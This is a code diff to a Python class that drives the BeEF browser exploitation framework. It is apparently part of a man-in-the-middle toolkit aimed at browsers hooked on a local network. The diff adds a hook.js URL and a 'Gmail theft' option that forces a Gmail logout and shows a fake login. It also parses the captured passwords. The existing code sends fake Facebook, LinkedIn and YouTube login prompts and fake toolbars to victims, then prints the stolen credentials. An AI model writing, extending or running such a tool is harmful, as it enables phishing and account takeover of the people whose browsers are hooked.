@@ -18,10 +18,12 @@ class Browser_Parser:
 		self.cert_key = "/opt/beef/beefFramework-key.pem"
 		self.cert_cert = "/opt/beef/beefFramework.pem"
 		self.redirect_url = 'https://192.168.3.1/sheep.jpg'
+		self.hook = 'https://192.168.3.1:3000/hook.js'
 		self.browser_id = None
 		self.cert = (self.cert_cert, self.cert_key)
 		self.api_key = self.get_api_key()
 		self.login_promt_id = None
+		self.account = None
 		self.toolbar_prompt_id = None
 		self.interface = MITM_Interface(self.user_id)
 		self.menu()
@@ -37,19 +39,34 @@ class Browser_Parser:
 		#if self.login_promt_id is None: ./RAP.sh st
 		socnet_choice= raw_input("fake login to send:")
 		if socnet_choice.lower() == 'facebook':
-			socnet_choice = 'Facebook'
+			socnet_choice, self.account = 'Facebook','facebook'
 		elif socnet_choice.lower() == 'linkedin':
-			socnet_choice = 'LinkedIn'
+			socnet_choice, self.account = 'LinkedIn', 'linkedIn'
 		elif socnet_choice.lower() == 'youtube':
-			socnet_choice = 'YouTube'
+			socnet_choice, self.account = 'YouTube', "youTube"
 		elif socnet_choice.lower() == 'generic':
-			socnet_choice = 'Generic'
+			socnet_choice, self.account = 'Generic', "generic"
 		else:
 			print "please pick a social network"
 			return None
 		hed = "Content-Type: application/json; charset=UTF-8"
 		to_beef_serv = {'choice': socnet_choice }
 		k_une = requests.post(url="https://192.168.3.1:3000/api/modules/" + str(self.browser_id) +"/242?token=" + str(self.api_key), cert=self.cert, verify=False, json=to_beef_serv)
+		k_dict = json.loads(k_une.text)
+		if k_dict['success'] == "true":
+			print "successfully sent prompt..."
+			print "command id:" + str(k_dict['command_id'])
+			self.login_promt_id = k_dict['command_id']
+			self.browser_db_router.update_BrowserTable_Login_Cmd(self.user_id, self.login_promt_id)
+		else:
+			print "prompt request unsucessful"
+			return None
+
+	def prompt_gmail_login(self):
+		self.account = "Google"
+		hed = "Content-Type: application/json; charset=UTF-8"
+		to_beef_serv = {'xss_hook_uri': self.hook, 'logout_gmail__interval' : 10000, 'wait_seconds_before_redirect':2000 }
+		k_une = requests.post(url="https://192.168.3.1:3000/api/modules/" + str(self.browser_id) +"/262?token=" + str(self.api_key), cert=self.cert, verify=False, json=to_beef_serv)
 		k_dict = json.loads(k_une.text)
 		if k_dict['success'] == "true":
 			print "successfully sent prompt..."
@@ -95,18 +112,22 @@ class Browser_Parser:
 		if self.browser_id is None:
 			print "find some browsers first"
 			return None
+		cmd_id = '/262/' if account.lower() == 'google' else '/242/'
 		idee = self.browser_db_router.get_browser_login_cmd(self.user_id)
 		command_id = self.browser_db_router.get_browser_session_id(self.user_id)
 		dets = requests.get(url="https://192.168.3.1:3000/api/modules/" 
 			+ str(self.browser_id) 
-			+ "/242/" + str(idee) 
+			+ cmd_id + str(idee) 
 			+ "?token=" 
 			+ str(self.api_key), cert = self.cert, verify=False)
 		c_dict = json.loads(dets.text)
 		try:
 			pprint.pprint(c_dict)
 			data = json.loads(c_dict['0']['data'])
-			password = str(data['data']).split(":")[1]
+			if not account.lower() == 'google':
+				password = str(data['data']).split(":")[1]
+			else:
+				password = str(data['data']).split(":")[2]
 			self.interface.read_traffic(account, password)
 			print password
 			return self.browser_db_router.update_BrowserTable_Login(self.user_id, 1)
@@ -170,7 +191,7 @@ class Browser_Parser:
 
 	def get_module_deets(self):
 		#debug: helper to get details on modules, delete after use
-		det = requests.get(url="https://192.168.3.1:3000/api/modules/252?token=" + str(self.api_key), cert=self.cert, verify=False)
+		det = requests.get(url="https://192.168.3.1:3000/api/modules/262?token=" + str(self.api_key), cert=self.cert, verify=False)
 		pprint.pprint(json.loads(det.text)) 
 		# 242 --> pretty theft, 252 --> firefox fake notification, 256 --> chrome fake bar, 263 --> IE fake bar
 
@@ -178,6 +199,21 @@ class Browser_Parser:
 	def save_hooked_browser_details(self):
 		#get hooked browsers --> get browser details
 		return self.get_hooked_browsers()
+
+	def check_toolbars(self):
+		pass
+
+	def check_lastpass(self):
+		pass
+
+	def check_popup_blocker(self):
+		pass
+
+	def check_adblock(self):
+		pass
+
+	def check_antivirus(self): 
+		pass
 
 	def menu(self):
 			print("*****BROWSER ANALYZER*****")
@@ -190,7 +226,8 @@ class Browser_Parser:
 								"3.Display fake toolbar\n"\
 								"4.Save fake login results\n"\
 								"5.Save fake toolbar results\n"\
-								"6.Exit\n")
+								"6.Exit\n"\
+								"7.Gmail theft\n")
 				try:
 					resp = int(resp)
 				except ValueError:
@@ -212,15 +249,18 @@ class Browser_Parser:
 				self.fake_toolbar(self.redirect_url)
 				self.menu()
 			elif resp == 4:
-				account = raw_input("please select account:")
-				self.get_prompt_credentials(account)
+				self.get_prompt_credentials(self.account) if self.account is not None else None
 				self.menu()
 			elif resp == 5:
 				self.get_toolbar_result()
 				self.menu()
 			elif resp == 6:
 				sys.exit(0)
+			elif resp == 7:
+				self.prompt_gmail_login()
+				self.menu()
 
 
 if __name__ == "__main__":
 	bp = Browser_Parser()
+	#bp.get_module_deets()
